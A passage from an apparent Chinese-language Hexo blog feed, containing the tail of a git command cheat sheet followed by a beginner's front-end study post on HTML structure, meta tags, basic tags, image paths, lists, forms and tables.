class="hljs-comment"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span>$ git revert [commit]<span class="hljs-comment"># 暂时将未提交的变化移除，稍后再移入</span>$ git stash$ git stash pop</code></pre></div><h3 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h3><div class="hljs code-wrapper"><pre><code>版本查询 -&gt;    git --version设置当前用户信息      git config --global user.name &quot;xxx&quot;    git config --global user.email &quot;xxx@xxx&quot;显示当前用户信息    git config --list显示git常用指令    git生成一个可供发布的压缩包git archive初始化仓库// xxx 代表仓库名/文件夹名    mkdir xxx    cd xxx    git init远程仓库// xx 指远程名称， xxx指远程地址// 如果是git clone得到的仓库，远程名称默认为origin// 添加远程仓库    git remote add xx xxx// 查询远程仓库名    git remote// 查询远程仓库详细信息    git remote -v// 复制远程仓库    git clone// 提交至远程仓库    git push -u xx xxx// 将本地与远程同步    git pull 或 git fetch &amp;&amp; git merge查询仓库状态    git status将文件添加到暂存区    git add.生成“后悔药”    git commit -m &quot;xxx&quot;“后悔药”查询    // 基本查询    git log    // 详细查询，包括修改对比    git log -p    // 以精简模式显示    git log --oneline    // 查看“后悔树”    git log --graph吃“后悔药”，版本回退    // xxx 代表编号或标记，可用git log查询    git checkout xxx    // 回退到最近的版本    git checkout -标记    git tag    // xx 代表标记， xxx代表注释    git tag -a xx -m &quot;xxx&quot;    // 显示标记    git show xx分支    // xxx代表分支名    // 产生分支    git branch xxx    // 分支跳转    git checkout xxx    // 创建并跳转分支    git checkout -b xxx    // 合并分支    git merge</code></pre></div><p><code>摘自阮一峰博客</code></p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>其他</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>前端学习总结🎺</title>
    <link href="/hexo_blog/2020/03/02/HTML%20&amp;%20CSS/"/>
    <url>/hexo_blog/2020/03/02/HTML%20&amp;%20CSS/</url>
    
    <content type="html"><![CDATA[<h3 id="第一部分-HTML"><a href="#第一部分-HTML" class="headerlink" title="第一部分 HTML"></a>第一部分 HTML</h3><hr><h4 id="第一章-职业规划和前景"><a href="#第一章-职业规划和前景" class="headerlink" title="第一章 职业规划和前景"></a>第一章 职业规划和前景</h4><hr><ul><li><p><strong>职业方向规划定位：</strong></p><ul><li><code>web</code>前端开发工程师</li><li><code>web</code>网站架构师</li><li>自己创业</li><li>转岗管理或其他<a id="more"></a></li></ul></li><li><p><strong><code>web</code>前端开发的前景展望：</strong></p><ul><li>未来<code>IT</code>行业企业需求最多的人才</li><li>结合最新的<code>html5</code>抢占移动端的市场</li><li>自己创业做老板</li><li>随着互联网的普及<code>web</code>开发成为企业的宠儿和核心</li></ul></li><li><p><strong><code>web</code>职业发展目标：</strong></p><ul><li><p>第一、梳理知识架构</p><ul><li>负责内容的<code>HTML</code></li><li>负责外观的<code>css</code>（层叠样式表）</li><li>负责行为的<code>js</code></li><li><code>ps</code>切图</li></ul></li><li><p>第二、分解目标（起步阶段、提升阶段、成型阶段）</p><ul><li><p>起步阶段：</p><ul><li>基本知识的掌握</li><li>常用工具的掌握</li><li>沟通技巧的掌握（围绕客户的需求）</li><li>良好的开发习惯（加注释、对齐方式）</li></ul></li><li><p>提升阶段：</p><ul><li>熟悉掌握<code>HTML</code>基本标签和属性</li><li>熟练掌握<code>css</code>的基本语法和使用</li><li>浏览器兼容和w3c标准的掌握</li><li>结合<code>html</code>+<code>css</code>+<code>js</code>开始系统项目的开发</li></ul></li><li><p>成型阶段：</p><ul><li>精通<code>DIV</code>+<code>CCS</code>布局</li><li>精通<code>css</code>样式表控制<code>html</code>标签</li><li>熟悉运用<code>js</code>制作动态网站的效果</li><li>能独立开发完成网站</li></ul></li></ul></li></ul></li></ul><hr><h4 id="第二章-html基本结构"><a href="#第二章-html基本结构" class="headerlink" title="第二章 html基本结构"></a>第二章 html基本结构</h4><hr><ul><li><p>认识HTML：</p><ul><li><code>html</code>不是一种编程语言，是一种标志语言</li><li>标记语言是由一套标识标签组成的</li><li><code>html</code>使用标签来描述网页</li></ul></li><li><p><code>html</code>结构：</p></li></ul><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/main.css&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 逻辑代码 --&gt;</span>    <span class="hljs-comment">&lt;!-- 逻辑代码底部 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;lib/jquery/jquery-2.1.1.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><ul><li><code>&lt;head&gt;</code>中添加信息</li></ul><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;smile@kang.cool&quot;</span>&gt;</span>------作者<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;</span>------网页描述<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;a,b,c&quot;</span>&gt;</span>------关键字,“，”分隔<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;expires&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;Wed, 26 Feb 1997 08：21：57 GMT&quot;</span>&gt;</span>------设定网页的到期时间。一旦网页过期，必须到服务器上重新调阅<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Pragma&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;no-cache&quot;</span>&gt;</span>------禁止浏览器从本地机的缓存中调阅页面内容<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Window-target&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;_top&quot;</span>&gt;</span>------用来防止别人在框架里调用你的页面<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Refresh&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;5;URL=http://kahn1990.com/&quot;</span>&gt;</span>------跳转页面，5指时间停留5秒 网页搜索机器人向导。用来告诉搜索机器人哪些页面需要索引，哪些页面不需要索引<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;robots&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;none&quot;</span>&gt;</span>------content的参数有all,none,index,noindex,follow,nofollow，默认是all<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;Shortcut Icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;favicon.ico&quot;</span>&gt;</span>------收藏图标<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Cache-Control&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;no-cache, must-revalidate&quot;</span>&gt;</span>------网页不会被缓存</code></pre></div><ul><li><p>不成对出现的标签<br><code>&lt;br&gt;</code> <code>&lt;hr&gt;</code>  <code>&lt;meta&gt;</code> <code>&lt;img&gt;</code>  <code>&lt;input..&gt;</code>  <code>&lt;option..&gt;</code>  <code>&lt;link&gt;</code></p><ul><li>特殊符号：<ul><li><code>&amp;nbsp</code>; —-&gt;空格</li><li><code>&amp;gt</code>; —&gt;大于号</li><li><code>&amp;lt</code>；—&lt;小于号</li><li><code>&amp;quot</code>；—&gt;引号</li><li><code>&amp;copy</code>;–&gt;版权号</li></ul></li></ul></li></ul><hr><h4 id="第三章-html基本标签"><a href="#第三章-html基本标签" class="headerlink" title="第三章 html基本标签"></a>第三章 html基本标签</h4><hr><ul><li><p><code>&lt;html&gt;</code> <code>&lt;head&gt;</code> <code>&lt;body&gt;</code>标签</p></li><li><p><code>&lt;h1&gt;&lt;/h1</code>—-<code>&lt;h6&gt;&lt;/h6&gt;</code>仅仅用于标题文本，不要为了产生粗体文本使用它们</p></li><li><p><code>&lt;p&gt;</code>标签  段落标签</p></li><li><p><code>&lt;strong&gt;&lt;b&gt;</code>标签</p><ul><li>都会让文字产生加粗效果<ul><li><code>&lt;strong&gt;</code>用于强调文本，强度更深，表示重要文本—&gt;用于<code>SEO</code>优化</li><li><code>&lt;b&gt;</code>只是视觉加粗效果—&gt;单纯为了产生加粗</li></ul></li></ul></li><li><p><code>&lt;em&gt;</code> <code>&lt;i&gt;</code>标签</p><ul><li><code>em</code>用于强调文本</li><li><code>i</code>只是视觉斜体效果</li><li><code>&lt;strong&gt;</code>比<code>&lt;em&gt;</code>强调更强</li></ul></li><li><p><code>span</code>标签</p><ul><li>对被用来组合文档中的行内元素</li><li>注意：span没有固定的格式表现，当对它应用样式时，才会产生视觉上的变化</li></ul></li><li><p><code>&lt;pre&gt;</code>标签</p><ul><li>文字的格式按源码的排版来显示，我们称之为预处理格式</li></ul></li><li><p><code>&lt;a&gt;</code>标签—&gt;他有一个必不可少的属性 href </p><ul><li><code>target</code>属性：</li><li><code>_self</code>(在原来页面打开) </li><li><code> _blank</code>（新窗口打开）</li><li><code>_top</code>（打开时忽略所有的框架） </li><li> <code>_parent</code>（在父窗口中打开）</li></ul></li><li><p>创建锚点和锚链接</p><ul><li>锚点也是一种超链接，是页面内进行跳转的超链接<div class="hljs code-wrapper"><pre><code>- 第一步：创建锚点 `&lt;a name=&quot;锚点名称&quot;&gt;&lt;/a&gt;`- 第二步：使用创建好的锚点名称 `&lt;a href=&quot;#锚点名称&quot;&gt;内容&lt;/a&gt;`</code></pre></div></li></ul></li><li><p><code>marquee</code>标签</p><ul><li>可以创建一个内容滚动效果<div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">marquee</span> <span class="hljs-attr">direction</span>=<span class="hljs-string">&quot;down&quot;</span> <span class="hljs-attr">loop</span>=<span class="hljs-string">&quot;4&quot;</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">this.stop()</span> <span class="hljs-attr">onmouseout</span>=<span class="hljs-string">this.start()</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">marquee</span>&gt;</span></code></pre></div></li><li><code>direction</code> 表示滚动方向，取值有（left,right,up,down,默认left）</li><li><code>loop </code>表示滚动循环的次数，默认为无限循环</li></ul><div class="hljs code-wrapper"><pre><code class="hljs js">onmouseover=<span class="hljs-built_in">this</span>.stop()  onmouseover=<span class="hljs-built_in">this</span>.start()  scrollamout=<span class="hljs-string">&quot;1&quot;</span>(滚动速度)</code></pre></div></li><li><p>表示当鼠标移上区域的时候停止滚动，鼠标移开继续滚动</p></li></ul><hr><h4 id="第四章-img图片标签与路径"><a href="#第四章-img图片标签与路径" class="headerlink" title="第四章 img图片标签与路径"></a>第四章 img图片标签与路径</h4><hr><ul><li><p>图片标签与路径：</p><ul><li>常见图片格式 <code>jpg</code> <code>png</code> <code>gif</code></li><li><code>Gif</code>     （只支持全透明）</li><li><code>Jpeg</code> /<code>jpg</code>     </li><li><code>Png</code> 半/全透明都支持</li></ul></li><li><p>图片标签写法 ：</p><ul><li><code>&lt;img src=&quot;&quot; alt=&quot;&quot; width=&quot;&quot; height=&quot;&quot; /&gt;</code></li></ul></li><li><p>图片四要素：</p><ul><li><code>src=&quot;&quot;</code>        图片路径</li><li><code>alt=&quot;&quot; </code>       图片含义</li><li><code>width=&quot;&quot;</code>     图片宽度 和图片大小保持一致</li><li><code> height=&quot;&quot;</code>     图片高度 和图片大小保持一致</li><li><code>title=&quot;&quot;</code></li></ul></li><li><p>路径知识：</p><ul><li><p>相对路径、绝对路径：</p><ul><li>相对路径：(Relative Path) 相对于该文件的路径；</li><li>绝对路径：(Absolute Path) 从磁盘出发的路径； </li></ul></li><li><p><code>&lt;img src=&quot;&quot; …… align=&quot;&quot; /&gt;</code> <code>align</code>属性–设置图片与后面文字的位置关系<br>值–<code>top</code>、<code>bottom</code>、<code>middle</code>、<code>absmiddle</code>、<code>left</code>、<code>right</code></p></li></ul></li><li><p>在静态页面中：</p><ul><li><p><code>/</code>开头表示根目录；</p></li><li><p><code>./</code>表示当前目录；（斜画线前面一个点）</p></li><li><p><code>../</code>上级目录；（斜画线前面两个点）</p></li><li><p>直接用文件名不带/也表示同一目录</p></li></ul><ul><li>这些都是相对于当前文件的位置来说的，如果用绝对路径的话就是写全了。</li></ul></li></ul><hr><h4 id="第五章-三种列表的讲解"><a href="#第五章-三种列表的讲解" class="headerlink" title="第五章 三种列表的讲解"></a>第五章 三种列表的讲解</h4><hr><ul><li>三种列表的知识讲解：<ul><li><code>&lt;ul&gt;</code>无序列表<ul><li>无序列表是一个没有顺序项目的列表，此列表项默认粗体圆点进行标识</li></ul></li></ul></li></ul><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-section">&lt;ul&gt;</span>   <span class="hljs-section">&lt;li&gt;</span><span class="hljs-section">&lt;/li&gt;</span>   <span class="hljs-section">&lt;li&gt;</span><span class="hljs-section">&lt;/li&gt;</span>   <span class="hljs-section">&lt;li&gt;</span><span class="hljs-section">&lt;/li&gt;</span><span class="hljs-section">&lt;/ul&gt;</span></code></pre></div><ul><li><ol>有序列表  - 有序列表也是一列项目，只是列表项目使用的是数字进行标记。 有序列表始于 `<ol>` 标签。每个列表项始于 `<li> `标签。</li></ul><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>内容一<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>内容二<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>内容三<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span></code></pre></div><ul><li><p>列表符号</p><ul><li><p>无序列表-列表符号:</p><ul><li><code>type=&quot;circle&quot;</code>  空心圆 <code>type=“disc” </code> 实心圆  默认值 <code>type=&quot;square&quot; </code> 方块符</li></ul></li><li><p>有序列表-列表符号</p><ul><li><code>type=&quot;A&quot;</code>    A B C D</li><li><code>type=&quot;a&quot;</code>    a b c d</li><li><code>type=&quot;1&quot;</code>    1 2 3 4  默认值type=”I”    I II III type=”i”     i ii iii</li></ul></li><li><p>列表嵌套</p></li><li><p>无序列表-嵌套</p></li></ul></li></ul><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>柚子  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>沙田柚<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>蜜柚<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>荔枝<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>苹果<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></code></pre></div><ul><li>有序列表-嵌套</li></ul><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>茶  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>红茶<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>绿茶<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>果汁<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>牛奶<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span></code></pre></div><ul><li>定义列表<ul><li>定义列表不仅仅是一列项目，而是项目及其注释的组合。定义列表以 <code>&lt;dl&gt;</code> 标签开始。每个定义列表项以 <code>&lt;dt&gt; </code>开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code> 开始。</li></ul></li></ul><div class="hljs code-wrapper"><pre><code class="hljs x86asm">&lt;<span class="hljs-built_in">dl</span>&gt;       &lt;<span class="hljs-built_in">dt</span>&gt;pc网页制作&lt;/<span class="hljs-built_in">dt</span>&gt;       &lt;<span class="hljs-built_in">dd</span>&gt;学习<span class="hljs-keyword">DIV</span>+CSS <span class="hljs-keyword">JS</span> JQ 项目实战&lt;/<span class="hljs-built_in">dd</span>&gt;       &lt;<span class="hljs-built_in">dt</span>&gt;手机网页制作&lt;/<span class="hljs-built_in">dt</span>&gt;       &lt;<span class="hljs-built_in">dd</span>&gt;手机网页制作实战&lt;/<span class="hljs-built_in">dd</span>&gt;&lt;/<span class="hljs-built_in">dl</span>&gt;</code></pre></div><ul><li><p><code>dd</code>是对<code>dt</code>的解释</p><ul><li><code>&lt; dl&gt;&lt; /dl&gt;</code>用来创建一个普通的列表,</li><li><code>&lt; dt&gt;&lt; /dt&gt;</code>用来创建列表中的上层项目，</li><li><code>&lt; dd&gt;&lt; /dd&gt;</code>用来创建列表中最下层项目，</li><li><code>&lt; dt&gt;&lt; /dt&gt;</code>和<code>&lt; dd&gt;&lt; /dd&gt;</code>都必须放在<code>&lt; dl&gt;&lt; /dl&gt;</code>标志对之间。</li></ul></li></ul><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>中国城市<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>北京 <span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>上海 <span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>广州 <span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>美国城市<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>华盛顿 <span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>芝加哥 <span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>纽约 <span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span></code></pre></div><ul><li><code>dl</code>是d<code>efinition list</code>的缩写</li><li><code>dt</code>是<code>definition title</code>的缩写</li><li><code>dd</code>是d<code>efinition description</code>的缩写</li></ul><ul><li><code>list-style</code>属性具有三个属性分量：</li><li><code>list-style-position</code> ：设置列表项图标的位置，位于文本内或者文本外</li><li><code>list-style-type</code>： 设置列表项图标的类型</li><li><code>list-style-image </code>：使用图像设置列表项图标</li></ul><hr><h4 id="第六章-表单元素-上"><a href="#第六章-表单元素-上" class="headerlink" title="第六章 表单元素(上)"></a>第六章 表单元素(上)</h4><hr><ul><li><p>表单标签:</p><ul><li><p><code>&lt;form&gt;</code>表单标签</p><ul><li><code>&lt;form&gt;</code>表单是一个包含表单元素的区域，包括起来的都是表单的内容<div class="hljs code-wrapper"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">form</span>&gt; &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;text&quot;</span>/&gt;&lt;/<span class="hljs-keyword">form</span>&gt;</code></pre></div></li></ul></li></ul></li><li><p>HTML标签 - <code>Action</code>和确认按钮： </p><ul><li>当用户单击确认按钮时，表单的内容会被传送到另一个文件。表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。<div class="hljs code-wrapper"><pre><code class="hljs pgsql">&lt;form action=&quot;html.do&quot; <span class="hljs-keyword">method</span>=&quot;get&quot;&gt;            username:  &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;text&quot; <span class="hljs-type">name</span>=&quot;user&quot; /&gt;           &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;submit&quot; <span class="hljs-keyword">value</span>=&quot;提  交&quot; /&gt;&lt;/form&gt;</code></pre></div></li></ul></li></ul><ul><li><p><code>HTML</code>标签 - 隐藏域隐藏标签：</p></li><li><p>隐藏域在页面中对于用户是不可见的，在表单中插入隐藏域的目的在于收集或发送信息，以利于被处理表单的程序所使用。浏览者单击发送按钮发送表单的时候，隐藏域的信息也被一起发送到服务器</p></li></ul><div class="hljs code-wrapper"><pre><code class="hljs pgsql">&lt;form&gt;             &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;hid&quot; <span class="hljs-keyword">value</span>=&quot;value&quot;&gt;&lt;/form&gt;</code></pre></div><ul><li><p><code>&lt;input&gt;</code>标签的掌握</p><ul><li><p>常用<code>type</code>类型：</p><ul><li><code>&lt;input type=&quot;&quot; name=&quot;&quot; value=&quot;&quot; /&gt;</code></li><li><code>type=&quot;text&quot; </code>       单行文本输入框</li><li><code>type=&quot;password&quot;</code>    密码（<code>maxlength=&quot;&quot;</code>）</li><li><code>type=&quot;radio&quot;  </code>     单项选择（<code>checked=&quot;checked&quot;</code>） </li><li><code>type=&quot;checkbox&quot; </code>   多项选择  </li><li><code>type=&quot;button&quot;  </code>    按钮</li><li><code>type=&quot;submit&quot;</code>    提交 <code>type=&quot;image&quot;</code>图片提交</li><li><code>type=&quot;file&quot;</code>    上传文件</li><li><code>type=&quot;reset&quot;    </code>重置</li><li><code>type=&quot;hidden&quot;</code>    隐藏</li></ul></li></ul></li><li><p>关于表单中的设置默认值：</p><div class="hljs code-wrapper"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;今天心情不错&quot;</span> /&gt;&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span>=&quot;&quot; &gt; &lt;<span class="hljs-keyword">option</span>  <span class="hljs-keyword">value</span>=&quot;&quot;&gt;&lt;/<span class="hljs-keyword">option</span>&gt; &lt;<span class="hljs-keyword">option</span>  <span class="hljs-keyword">value</span>=&quot;&quot; selected=&quot;selected&quot;&gt;&lt;/<span class="hljs-keyword">option</span>&gt;&lt;<span class="hljs-keyword">select</span>&gt;</code></pre></div></li><li><p><code>textarea</code>没有默认值</p></li><li><p><code>&lt;label&gt;</code>标签的使用</p><ul><li><p><code>&lt;label&gt;&lt;/label&gt;</code></p><ul><li><code>label</code> 元素不会向用户呈现任何特殊效果。</li><li>不过，它为鼠标用户改进了可用性。</li><li>如果您在 <code>label</code> 元素内点击文本，就会触发此控件。</li><li>就是说，当用户选择该标签时，浏览器就会自动将焦点转到和标签相关的表单控件上。</li></ul></li><li><p><code>&lt;label&gt;</code> 标签的<code> for</code> 属性应当与相关元素的 <code>id </code>属性相同。</p></li><li><p>例子：（重要—注册表单–用户体验–必做）</p><div class="hljs code-wrapper"><pre><code class="hljs xquery"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>单向选择<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span>男：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span>&lt;input type=<span class="hljs-string">&quot;radio&quot;</span><span class="hljs-built_in"> name</span>=<span class="hljs-string">&quot;sex&quot;</span><span class="hljs-built_in"> id</span>=<span class="hljs-string">&quot;male&quot;</span>/&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;nv&quot;</span>&gt;</span>女：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span>&lt;input type=<span class="hljs-string">&quot;radio&quot;</span><span class="hljs-built_in"> name</span>=<span class="hljs-string">&quot;sex&quot;</span>checked=<span class="hljs-string">&quot;check&quot;</span>/&gt;</code></pre></div></li></ul></li></ul><hr><h4 id="第七章-表单和表格-下"><a href="#第七章-表单和表格-下" class="headerlink" title="第七章 表单和表格(下)"></a>第七章 表单和表格(下)</h4><hr><ul><li><p>表单和表格标签：</p><ul><li><code>&lt;textarea&gt;</code>文本域标签</li><li><code>&lt;textarea&gt;</code>标签：</li><li><code>&lt;textarea&gt;&lt;/textarea&gt;</code>是文本域标签，可以在其中插入一段文字内容，它有两个常用属性<code>rows</code>和<code>cols</code></li></ul></li><li><p>注意：</p><ul><li><code>rows</code>表示这个文本域有多少行</li><li><code>cols</code>表示这个文本域有多少列</li></ul></li><li><p>除了这两个属性它还有<code>readonly</code>（只读，文本域的内容无法改变，相当于协议）和<code>title</code>（鼠标放上提示）</p></li><li><p><code>&lt;select&gt;</code>标签的掌握</p><ul><li>注：当提交表单时，浏览器会提交选定的项目，或者收集用逗号分隔的多个选项，将其合成一个单独的参数列表，并且在将 <code>&lt;select&gt;</code> 表单数据提交给服务器时包括 <code>name </code>属性<div class="hljs code-wrapper"><pre><code class="hljs pgsql">&lt;form&gt;          &lt;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span>=&quot;&quot;  id=&quot;&quot;&gt;         &lt;<span class="hljs-keyword">option</span> <span class="hljs-keyword">value</span>=&quot;1&quot;&gt;<span class="hljs-number">1</span>月&lt;/<span class="hljs-keyword">option</span>&gt;            &lt;<span class="hljs-keyword">option</span> <span class="hljs-keyword">value</span>=&quot;2&quot;&gt;<span class="hljs-number">2</span>月&lt;/<span class="hljs-keyword">option</span>&gt;      &lt;/<span class="hljs-keyword">select</span>&gt;&lt;/form&gt;</code></pre></div></li></ul></li><li><p>常用到的属性：<code>disabled=“disabled”  name=&quot;sel&quot;  size=&quot;2&quot;</code></p></li></ul><ul><li><p><code>&lt;table&gt;</code>表格标签</p></li><li><p><code> &lt;table&gt;</code>表格标签：<code>&lt;table&gt;</code>是表格标签，可以用它定义一个表格。</p><div class="hljs 